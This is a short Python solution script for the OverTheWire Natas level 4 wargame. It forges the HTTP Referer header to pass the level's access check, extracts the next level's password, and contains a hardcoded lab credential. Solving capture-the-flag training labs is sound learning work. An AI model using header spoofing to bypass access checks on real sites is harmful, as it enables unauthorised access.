#!/usr/bin/env python

#Importing Packages and Libraries
import requests
import re

#Declaring the Authentication
username = 'natas4'
password = 'tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm'
url = 'http://%s.natas.labs.overthewire.org/' %username

#Functions
header = {"Referer" : "http://natas5.natas.labs.overthewire.org/"}
response = requests.get(url, auth = (username, password), headers = header)
content = response.text

#Printing the Source Code
#print(content)

#Printing only the Password
print(re.findall('natas5 is (.*)', content)[0])